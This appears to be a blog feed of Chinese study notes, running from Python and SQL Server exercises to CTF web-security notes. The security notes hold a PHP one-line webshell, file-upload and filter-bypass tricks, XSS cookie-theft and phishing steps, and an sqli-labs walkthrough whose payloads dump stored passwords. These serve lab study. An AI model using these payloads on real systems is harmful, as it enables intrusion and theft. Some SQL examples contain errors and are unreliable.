循环中<br>[::2]表示从开头到最后，区间为2</p><p>所以list(range(6))[::2]的意思是从[0,1,2,3,4,5]中以2为间距取出数字组成一个整数列表<br><img src="https://img-blog.csdnimg.cn/2020101920130989.png#pic_center" alt="代码实现"><br>7.表达式 ‘abc10’.isdigit() 的值为： False<br>解析：.isdigit()判断所有字符都是数字<br>.isalnum()判断所有字符都是数字或者字母<br>.isalpha()判断所有字符都是字母<br>.islower()判断所有字符都是小写；<br>.isupper()判断所有字符都是大写；<br>.istitle()判断所有单词都是首字母大写<br>.isspace()判断所有字符都是空白字符\t、\n、\r ；<br><img src="https://img-blog.csdnimg.cn/20201019201947711.png#pic_center" alt="代码实现"><br>8.假设n为整数，那么表达式 n&amp;1 == n%2 的值为：True<br>解析：<br><img src="https://img-blog.csdnimg.cn/2020101920214236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="网上查到的解析"><br>9.表达式 int(4*<em>0.5) 的值为：  2<br>解析：</em>表示乘号，**表示次方<br><img src="https://img-blog.csdnimg.cn/20201019202415217.png#pic_center" alt="代码实现"><br>10.已知 x = {1:2}，那么执行语句 x[2] = 3之后，x的值为： {1:2,2:3}<br>解析：x={1:2}是定义了一个字典，其中1对应了2，x[2]=3是修改字典x中的数据，修改2对应的值为3，如果2不存在，那就将这个键值对添加到字典中，所以最后输入字典为{1:2,2:3}<br><img src="https://img-blog.csdnimg.cn/20201019203805625.png#pic_center" alt="代码实现"><br>11.Python3.x语句for i in range(3):print(i,end=’,’)的输出结果为：0,1,2,<br>解析：如果没有end=‘ ’，每次print语句都会自动换行，而有了这个语句，数据就不会自动换行，而是在输出的数据后面加上空格或指定的符号（空格数取决于引号里面的空格数）<br><img src="https://img-blog.csdnimg.cn/20201020191538770.png#pic_center" alt="代码实现"><br>12.Python 3.x语句 print(1, 2, 3, sep=’,’) 的输出结果为：  1,2,3<br>解析：end: 默认是换行，表示两个字符串最后以什么结尾。eg: 换行 end=”\n”<br>sep: 默认是空格，表示两个字符串之间用什么分割。eg: 空格 sep=” “,可以使用sep=””取消多个字符串之间的间距<br><img src="https://img-blog.csdnimg.cn/20201020192319490.png#pic_center" alt="代码实现"><br>13.表达式 range(10,20)[4] 的值为： 14<br>解析：根据我的分析，应该是在range(10,20)中进行索引[4]<br><img src="https://img-blog.csdnimg.cn/20201020193401917.png#pic_center" alt="代码实现"><br>14.表达式 round(3.4) 的值为  3<br>解析：round()方法的作用是对于浮点数进行四舍五入<br>round(x,n) 返回浮点数x的四舍五入的小数点后的n位数值<br><img src="https://img-blog.csdnimg.cn/20201020193608206.png#pic_center" alt="代码实现"></p><p>15.已知 x = ‘a234b123c’，并且re模块已导入，则表达式 re.split(‘\d+’, x) 的值为 [‘a’,’b’,’c’]<br>解析：re.split是按照规定的字符进行分割，规定的字符为整数型，因此x以数字为分割条件，分成了’a’’b’’c’三个字符。</p><p>re模块中的常见函数：<br>search(): 在整个字符串中查找，返回第一个匹配内容，如果找到返回match对象，没找到返回None<br>match()：从字符串的第一个字符开始匹配，如果找到返回match对象，没找到返回None<br>findall()：在字符串中匹配，如果成功返回match对象，如果失败返回None<br>finditer():在字符串中匹配，如果成功返回match可迭代对象，如果失败返回None<br>split():按照匹配的字符串进行分割<br>sub():替换匹配的子字符串，返回替换之后的字符串<br><img src="https://img-blog.csdnimg.cn/20201020194251765.png#pic_center" alt="代码实现"><br>16.表达式 ‘abc10’.isalpha() 的值为  False<br>解析：isalpha() 方法检测字符串是否只由字母或汉字组成<br><img src="https://img-blog.csdnimg.cn/20201020194912839.png#pic_center" alt="代码实现"><br>17.已知 x = [[1]] * 3，那么执行语句 x[0][0] = 5之后，变量x的值为 [[5], [5], [5]]<br>解析：<br><img src="https://img-blog.csdnimg.cn/20201020200053383.png#pic_center" alt="代码实现"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库索引与视图笔记</title>
      <link href="posts/6f2d.html"/>
      <url>posts/6f2d.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、索引"><a href="#一、索引" class="headerlink" title="一、索引"></a>一、索引</h1><p>INDEX   索引（默认为非唯一非聚集）<br>UNION  INDEX  唯一索引<br>CLUSTERED INDEX 聚集索引</p><h2 id="1-创建索引："><a href="#1-创建索引：" class="headerlink" title="1.创建索引："></a>1.创建索引：</h2><p>例：对Employee中的姓名列建立非聚集索引Employee_name</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> Employee_name <span class="token keyword">ON</span> Employee<span class="token punctuation">(</span>EmplName<span class="token punctuation">)</span></code></pre><p>例：对SalesOrder中的商品号和订单号建立唯一聚集索引<br>CREATE UNION CLUSTERED INDEX IX_GoodsIDOrderID ON SalesOrder(GoodsID,OrderID)</p><h2 id="2-使用系统存储过程查看索引属性："><a href="#2-使用系统存储过程查看索引属性：" class="headerlink" title="2.使用系统存储过程查看索引属性："></a>2.使用系统存储过程查看索引属性：</h2><pre class=" language-sql"><code class="language-sql">EXE sp_helpindex Employee</code></pre><p>   其中Employee是需要查看索引的表名-</p><h2 id="3-修改索引"><a href="#3-修改索引" class="headerlink" title="3.修改索引"></a>3.修改索引</h2><p>REBUILD  重建索引<br>rebuild_index_option  重建索引选项<br>例：修改索引IX_DiscountTotal,将填充因子（FILLFACTOR）改为80</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">INDEX</span> IX_DiscountTotal <span class="token keyword">ON</span> OrderDetailREBUILD  <span class="token keyword">WITH</span><span class="token punctuation">(</span>PAD_INDEX<span class="token operator">=</span><span class="token keyword">ON</span><span class="token punctuation">,</span><span class="token keyword">FILLFACTOR</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><h2 id="4-删除索引"><a href="#4-删除索引" class="headerlink" title="4.删除索引"></a>4.删除索引</h2><p>例：删除已建索引IX_DiscountToal</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">INDEX</span> OrderDetail<span class="token punctuation">.</span>IX_DiscountToal6</code></pre><h1 id="二、视图"><a href="#二、视图" class="headerlink" title="二、视图"></a>二、视图</h1><h2 id="1-创建视图"><a href="#1-创建视图" class="headerlink" title="1.创建视图"></a>1.创建视图</h2><p>例：创建StoreSales数据库上的视图Emp_view，视图包含Employee表的全部列。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">VIEW</span> Emp_view<span class="token keyword">AS</span><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token keyword">FROM</span> Employee</code></pre><h2 id="2-查询视图"><a href="#2-查询视图" class="headerlink" title="2.查询视图"></a>2.查询视图</h2><p>例：从视图Emp_view查询年龄大于40的员工的员工号、姓名和年龄。</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> EmplID<span class="token punctuation">,</span>EmplName<span class="token punctuation">,</span><span class="token number">2020</span><span class="token operator">-</span>year<span class="token punctuation">(</span>Birthday<span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token string">'年龄'</span><span class="token keyword">FROM</span> Emp_view<span class="token keyword">WHERE</span> EmplName<span class="token operator">=</span>’刘强’</code></pre><h2 id="3-更新视图"><a href="#3-更新视图" class="headerlink" title="3.更新视图"></a>3.更新视图</h2><p>插入数据：<br>例：向视图Emp_view中插入一行数据“E007，张三，男，1996-3-6，5000，D002”</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> Emp_view <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">'E007'</span><span class="token punctuation">,</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'1996-3-6'</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'5000'</span><span class="token punctuation">,</span><span class="token string">'D002'</span><span class="token punctuation">)</span></code></pre><p>修改数据：<br>例：修改视图Emp_view，将员工张三的工资改为6000,部门号改为D001</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">UPDATE</span> Emp_view <span class="token keyword">SET</span> Wages<span class="token operator">=</span><span class="token string">'6000'</span><span class="token punctuation">,</span>DeptID<span class="token operator">=</span><span class="token string">'D001'</span><span class="token keyword">WHERE</span> EmplName<span class="token operator">=</span><span class="token string">'张三'</span></code></pre><p>例：删除视图Emp_view中张三这名员工的相关信息</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> Emp_view<span class="token keyword">WHERE</span> EmplName<span class="token operator">=</span><span class="token string">'张三'</span></code></pre><h2 id="4-删除视图"><a href="#4-删除视图" class="headerlink" title="4.删除视图"></a>4.删除视图</h2><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">VIEW</span> Emp_view </code></pre><pre class=" language-sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">VIEW</span> EmpDep_view</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL查询语句练习</title>
      <link href="posts/9b09.html"/>
      <url>posts/9b09.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL查询语句练习"><a href="#SQL查询语句练习" class="headerlink" title="SQL查询语句练习"></a>SQL查询语句练习</h1><h2 id="有如下三个关系："><a href="#有如下三个关系：" class="headerlink" title="有如下三个关系："></a>有如下三个关系：<img src="https://img-blog.csdnimg.cn/20201005230107377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></h2><h2 id="用T—SQL命令按要求完成下列查询："><a href="#用T—SQL命令按要求完成下列查询：" class="headerlink" title="用T—SQL命令按要求完成下列查询："></a>用T—SQL命令按要求完成下列查询：</h2><p>1：查询所有年龄在20岁以下的学生姓名及年龄</p><pre><code>SELECT  SNAME,AGEFROM  SWHERE  AGE&lt;20</code></pre><p>2：查询考试成绩有不及格的学生的学号。</p><pre><code>SELECT  DISTINCT  SNOFROM  SCWHERE  GRADE&lt;60</code></pre><p>3：查询所有年龄在20至23岁之间的学生姓名、系别及年龄。</p><pre><code>SELECT  SNAME,SDEPT,AGEFROM  SWHERE  AGE&gt;=20  AND  AGE&lt;=23</code></pre><p>4：查询计算机系、数学系、信息系的学生姓名、性别。</p><pre><code>SELECT  SNAME,SEXFROM  SWHERE  SDEPT  IN  (‘计算机系’,’数学系’,’信息系’)</code></pre><p>5：查询所有不姓“张”的学生的姓名。</p><pre><code>SELECT  SNAMEFROM  SWHERE  SNAME  NOT  LIKE  ‘张%’</code></pre><p>6：查询姓“上官”且全名为3个汉字的学生姓名。</p><pre><code>SELECT  SNAMEFROM  SWHERE  SNAME  LIKE  ‘上官_’</code></pre><p>7：查询DB_Design课程的课程号。</p><pre><code>SELECT  CNOFROM  CWHERE  CNMAE=’ DB_Design’</code></pre><p>8：查询缺考的学生的学号和课程号。</p><pre><code>SELECT  SNO,CNOFROM  SCWHERE  GRADE  IS  NULL</code></pre><p>9：查询计算机系20岁以下的学生的学号和姓名。</p><pre><code>SELECT  SNO,SNAMEFROM  SWHERE  SDEPT=’计算机系’  AND  AGE&lt;20</code></pre><p>10：查询选修了C3课程的学生的学号和成绩，其结果按分数的降序排列。</p><pre><code>SELECT  SNO,GRADEFROM  SCWHERE  CNO=’C3’ORDER  BY  GRADE  DESC</code></pre><p>11：查询全体学生的情况，查询结果按所在系升序排列，对同一系中的学生按年龄降序排列。</p><pre><code>SELECT  *FROM  SORDER  BY  SDEPT  ASC,AGR  DESC</code></pre><p>12：查询学生总人数。</p><pre><code>SELECT  COUNT(SNO)FROM  S</code></pre><p>13：查询选修了课程的学生人数。</p><pre><code>SELECT  COUNT(DISTINCT  SNO)FROM  SC</code></pre><p>14：计算选修了C1课程的学生平均成绩。</p><pre><code>SELECT  AVG(GRADE)FROM  SCWHERE  CNO=’C1’</code></pre><p>15：查询学习C3课程的学生最高分数。</p><pre><code>SELECT  MAX(GRADE)FROM  SCWHERE  CNO=’C3’</code></pre><p>16：查询各个课程号与相应的选课人数。</p><pre><code>SELECT  CNO,COUNT(SNO)FROM  SCGROUP  BY  CNO</code></pre><p>17：查询选修了C2课程且成绩在90分以上的所有学生。</p><pre><code>SELECT  SNOFROM  SCWHERE  CNO='C2'  AND  GRADE&gt;90</code></pre><p>18：查询计算机系选修了3门以上课程的学生的学号。</p><pre><code>SELECT  SNOFROM S,SCWHERE  S.SNO=SC.SNO  AND  SDEPT = '计算机系' GROUP  BY  SNOHAVING COUNT(*)&gt;3</code></pre><p>19：查询与“张三”在同一个系学习的学生学号、姓名和系别。</p><pre><code>SELECT  SNO,SNAME,SDEPTFROM  SWHERE  SDEPT  IN    (SELECT  SDEPT     FROM  S     WHERE SNAM='张三')</code></pre><p>20：查询选修课程名为“数据库”的学生学号和姓名。</p><pre><code>SELECT  SNO,SNAMEFROM  S,SC,CWHERE  S.SNO=SC.SNO  AND  C.CNO=SC.CNO  AND   CNO='数据库'</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据库笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传漏洞</title>
      <link href="posts/4491.html"/>
      <url>posts/4491.html</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞："><a href="#文件上传漏洞：" class="headerlink" title="文件上传漏洞："></a>文件上传漏洞：</h1><p><strong>如果服务器配置不当或者没有进行足够的过滤，而导致用户可以向服务器上传任意文件<br>包括木马，病毒，恶意脚本或者WebShell等，并被脚本解析器执行，这就产生了文件上传漏洞<br>一句话木马（小马）：<!--?php @eval($_POST['test']);?--><br>需要和中国菜刀搭配</strong></p><h2 id="中国菜刀的三个基本功能："><a href="#中国菜刀的三个基本功能：" class="headerlink" title="中国菜刀的三个基本功能："></a>中国菜刀的三个基本功能：</h2><p><strong>1.文件管理 2.数据库管理 3.虚拟终端</strong></p><h2 id="前期需要搜集什么信息？"><a href="#前期需要搜集什么信息？" class="headerlink" title="前期需要搜集什么信息？"></a>前期需要搜集什么信息？</h2><p><strong>1.目标使用的语言<br>2.中间件<br>3.服务器系统<br>4.可以上传什么类型的文件</strong></p><h1 id="解析漏洞："><a href="#解析漏洞：" class="headerlink" title="解析漏洞："></a>解析漏洞：</h1><h2 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h2><p><strong>1.目录解析：默认会把 .asp, .asa目录下的文件都解析成asp文件。<br>如：/test.asp/test.jpg<br>2.文件解析：<br>/test.asp;1.jpg<br>IIS6.0默认的可执行文件除了asp还包括 .asa、 .cer、 .cdx</strong></p><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p><strong>Apache1.x和Apache2.x中存在解析漏洞<br>在解析文件时有一个顺序，当碰到不认识的扩展名时，将会从后向前解析<br>直到碰到认识的扩展名为止，如果都不认识，则会暴露其源码<br>如：test.php.xxx</strong></p><h2 id="Nginx-lt-0-8-03空字节代码执行漏洞"><a href="#Nginx-lt-0-8-03空字节代码执行漏洞" class="headerlink" title="Nginx<0.8.03空字节代码执行漏洞"></a>Nginx&lt;0.8.03空字节代码执行漏洞</h2><p><strong>影响版本：0.5.x,0.6.x,0.7&lt;=0.7.65,0.8&lt;=0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问test.jpg%00.php来执行其中的代码</strong></p><h2 id="常见的检测方式："><a href="#常见的检测方式：" class="headerlink" title="常见的检测方式："></a>常见的检测方式：</h2><p><strong>1.客户端检测(javascript检测文件扩展名)：可以通过Bp抓包进行绕过<br>2.服务端检测(文件扩展名检测)：黑白名单<br>   黑名单：文件名大小写绕过、名单列表绕过(如asa,cer,cdx,php3等)、0x00截断<br>   白名单:解析漏洞、0x00截断<br>3.服务端检测(MIME类型、Content-Type内容)<br>所谓MIME类型检测实际上就是客户端在上传文件到服务端的时候，服务端对客户端上传文件的<br>Content-Type类型进行检测，如果是白名单所允许的，则可以正常上传，否则上传失败</strong></p><h2 id="常见的例子："><a href="#常见的例子：" class="headerlink" title="常见的例子："></a>常见的例子：</h2><p><strong>‘.gif’:’image/gif’<br>‘.doc’:’application/msword’<br>‘.asp’:’application/x-asp’<br>4.服务端检测(文件头检测)<br>插入服务器允许的文件头部进行绕过<br>如：GIF968a</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web,CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="posts/6721.html"/>
      <url>posts/6721.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>静态网页：不存在SQL注入漏洞<br>动态网页：可能存在SQL注入漏洞</strong></p><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p><strong>SQL注入是一种常见的Web安全漏洞，攻击者利用这个漏洞，<br>可以访问或修改数据，或者利用潜在的数据库漏洞进行攻击</strong></p><h2 id="关于注入点的位置："><a href="#关于注入点的位置：" class="headerlink" title="关于注入点的位置："></a>关于注入点的位置：</h2><p><strong>GET数据<br>POST数据<br>HTTP头部(HTTP请求报文其他字段)<br>Cookie数据等</strong></p><h2 id="SQL注入分类："><a href="#SQL注入分类：" class="headerlink" title="SQL注入分类："></a>SQL注入分类：</h2><p><strong>SQL注入根据注入数据类型，通常可分为数字型和字符型<br>根据注入手法分类，大致可以分为以下几个类别<br>1.联合查询注入<br>2.报错型注入<br>3.布尔型注入<br>4.基于时间延迟注入</strong></p><h2 id="如何判断SQL注入"><a href="#如何判断SQL注入" class="headerlink" title="如何判断SQL注入"></a>如何判断SQL注入</h2><p><strong>**单引号判断<br>1.数字型注入判断：and1=1  and1=2<br>                              参数进行运算 +1 -1  ‘+’→’%2B’<br>2.字符型注入判断(需要闭合单引号)<br>‘and ‘1’=’1     ‘and’1’=’2<br>寻找显示位 order by 查询字段数目<br>查询语句1 union 查询语句2</strong></p><p><strong>schemata       schema_name 所有的数据库名<br>tables             table_name表名  table_schema表所属的数据库<br>columns         column_name字段名  table_name表名  table_schema数据库<br>group_concat(字段)**</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web,CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS学习笔记</title>
      <link href="posts/3459.html"/>
      <url>posts/3459.html</url>
      
        <content type="html"><![CDATA[<h1 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS : 跨站脚本攻击"></a>XSS : 跨站脚本攻击</h1><p><strong>将恶意的js代码进行注入<br>注入点的两个要求：<br>1.输入的东西可以在页面上显示.<br>2.一个可以自行控制的参数位置<br>GET,POST,COOKIE 如用户名输入框，留言板等</strong></p><h2 id="1-反射型XSS："><a href="#1-反射型XSS：" class="headerlink" title="1.反射型XSS："></a>1.反射型XSS：</h2><p><strong>即输即用，插入一次而没有进入服务器的存储结构中<br>?wd后为传输搜索选项的内容，可以进行插入恶意代码<br>这样的payload较长，可能带有敏感字符如&lt; script&gt;标签等，<br>容易失败，所以可以利用网上一些缩短url工具进行欺骗</strong></p><h2 id="2-存储型XSS："><a href="#2-存储型XSS：" class="headerlink" title="2.存储型XSS："></a>2.存储型XSS：</h2><p><strong>一劳永逸 向网页插入的代码会被网站添加到服务器的存储结构中<br>持久性的跨站脚本，更具威胁性<br>一般用来网站渗透、挂马、蠕虫病毒、钓鱼流量导流等<br>只要在HTML中加入&lt; script&gt;标签即可让浏览器执行我们需要的js脚本<br>  Javascript脚本语言：一种直译式脚本语言<br>广泛用于客户端   用来给HTML网页增加动态功能<br>很容易被客户端修改，可以控制浏览器做各种动作例如弹窗、重定向、刷新等</strong></p><h1 id="XSS检测："><a href="#XSS检测：" class="headerlink" title="XSS检测："></a>XSS检测：</h1><p><strong>XSS攻击通常需要获取网站用户的登录信息，如登录账号密码或者登录凭证<br>通常渗透测试中我们将测试代码浓缩为：<br>&lt; script&gt;alert(1)&lt; /script&gt;构造网页弹窗<br>这个payload中包含了几乎所有XSS利用的前提条件<br>–可以插入&lt; script&gt;标签、包含js代码的函数alert,<br>如果浏览器弹窗，说明可能存在XSS注入</strong></p><h1 id="XSS构造"><a href="#XSS构造" class="headerlink" title="XSS构造"></a>XSS构造</h1><p><strong>利用XSS漏洞，攻击者可以进行两种攻击：钓鱼和盗取Cookie<br>钓鱼步骤：<br>1.根据原始网页构造一个克隆页面<br>2.通过XSS将克隆页面导入网站后台<br>3.用户被骗后输入信息，如用户名密码<br>4.收集到信息后，我们将用户的用户名密码导入到钓鱼接受平台中<br>盗取Cookie利用原理和钓鱼相同，我们接受到用户cookie后就能够伪造身份登录后台了<br>留言板框的标签为&lt; textarea&gt;，为了屏蔽这个标签，我们使前后&lt; textarea&gt;闭合<br>如在留言板里输入&lt; /textarea&gt;&lt; script ……&gt;&lt; /script&gt;&lt; textarea&gt;</strong></p><h1 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h1><p><strong>HttpOnly属性：让我们的cookie只能被http控制而不能被js控制<br>XSS绕过<br>第一种思路：不同的标签<br>主要思想为<br>           1.这个标签可以写入连接导致跳转或者包含其他页面，如&lt; img&gt;<br>            2.这个标签中可以添加事件而执行js，例如&lt; input&gt;<br>&lt; img src=”javascript:alert(‘xss’)”&gt;可以使用js的伪协议去执行xss代码，<br>当然也可以在img中导入一个外网带有xss代码链接，但是也不是所有的web浏览器都支持伪协议<br>第二种思路：产生自己的事件<br>js本来就是一种动态脚本语言<br>如果我们的输入在input标签中，后者能够自己写入一个input标签，<br>就可以构建自己的事件如onclick(点击鼠标)，onmouseover(鼠标移动)，onkeydown(敲击键盘)等响应事件<br>可以利用的事件一般分为3类：<br>1.用户接口IO（鼠标，键盘）<br>2.逻辑（处理的结果）<br>3.变化（对文档的修改）</strong></p><h2 id="编码绕过、常用编码："><a href="#编码绕过、常用编码：" class="headerlink" title="编码绕过、常用编码："></a>编码绕过、常用编码：</h2><p><strong>URL编码：通过%和ascii码编码但是要确认服务器会对我们的输入解码，否则起到反作用<br>HTML实体编码：命名实体：以&amp;开头，分号结尾的，例如“&lt;”编码为“&amp;lt”<br>字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值”，<br>                例如“&lt;”可以编码为“&lt;”和“&lt;”<br>js编码:四种编码形式，例如“e”为”\145”或”\x65”或”\u0065”<br>css编码：用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或”65”或”00065”<br>理解XSS编码顺序：在什么位置应该被谁理解</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web,CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs</title>
      <link href="posts/57a7.html"/>
      <url>posts/57a7.html</url>
      
        <content type="html"><![CDATA[<p><strong>schema：数据库中的Schema，为数据库对象的集合<br>database 数据库<br>table  表<br>column  列<br>schemata：为当前数据库中的每个架构返回一行<br>group_concat()一次性显示<br>information_schema 数据库是 MySQL 自带的信息数据库。用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。</strong></p><h1 id="sqli-labs-less-1"><a href="#sqli-labs-less-1" class="headerlink" title="sqli-labs less-1"></a><strong>sqli-labs less-1</strong></h1><p><img src="https://img-blog.csdnimg.cn/20200428184940527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70"><br><strong>1.?id=1<br><img src="https://img-blog.csdnimg.cn/20200428185128798.png"><br><img src="https://img-blog.csdnimg.cn/20200428185141286.png"><br>2.?id=1’报错，发现注入点<br><img src="https://img-blog.csdnimg.cn/20200428185208528.png"><br><img src="https://img-blog.csdnimg.cn/20200428185216186.png"><br>3.添加注释，使其不报错<br><img src="https://img-blog.csdnimg.cn/2020042818523544.png"><br><img src="https://img-blog.csdnimg.cn/20200428185241751.png"><br>4.使用order by 进行查询长度，得出有3个字节<br><img src="https://img-blog.csdnimg.cn/20200428185249454.png"><br><img src="https://img-blog.csdnimg.cn/20200428185255441.png"><br><img src="https://img-blog.csdnimg.cn/20200428185320168.png"><br><img src="https://img-blog.csdnimg.cn/20200428185326483.png"><br>5.使用union select联合查询显示位，注意：最前面的数改为-1或者很大的值<br><img src="https://img-blog.csdnimg.cn/20200428185335180.png"><br><img src="https://img-blog.csdnimg.cn/20200428185346923.png"><br>6.database()查询当前数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818535675.png"><br><img src="https://img-blog.csdnimg.cn/20200428185401490.png"><br>7. version()查询当前数据库版本<br><img src="https://img-blog.csdnimg.cn/20200428185608300.png"><br><img src="https://img-blog.csdnimg.cn/20200428185614530.png"><br>8. (select group_concat(schema_name) from information_schema.schemata )查看所有数据库名<br><img src="https://img-blog.csdnimg.cn/2020042818570396.png"><br><img src="https://img-blog.csdnimg.cn/20200428185709930.png"><br>9. (select group_concat(table_name) from information_schema.tables where table_schema=’security’)查看security数据库中的所有表<br><img src="https://img-blog.csdnimg.cn/20200428185718490.png"><br><img src="https://img-blog.csdnimg.cn/20200428185722279.png"><br>10.(select group_concat(column_name) from information_schema.columns where table_name=’users’)查看users表下的所有列<br><img src="https://img-blog.csdnimg.cn/20200428185729161.png"><br><img src="https://img-blog.csdnimg.cn/20200428185732778.png"><br>11.(select group_concat(username) from security.users）查看username列下的数据<br>    (select group_concat(password) from security.users)     查看password列下的数据<br><img src="https://img-blog.csdnimg.cn/20200428185742437.png"><br><img src="https://img-blog.csdnimg.cn/2020042818574752.png"></strong></p><h1 id="sqli-labs-less-2"><a href="#sqli-labs-less-2" class="headerlink" title="sqli-labs less-2"></a><strong>sqli-labs less-2</strong></h1><p>1.根据提示得知参数为id<br><img src="https://img-blog.csdnimg.cn/20201015165419790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"></p><p>2.加入参数，页面回显正确</p><p><img src="https://img-blog.csdnimg.cn/20201015165721272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70#pic_center"><br>3.判断注入类型，首先进行单引号测试，发现加上注释后依然报错，说明此处不存在字符型注入<br><img 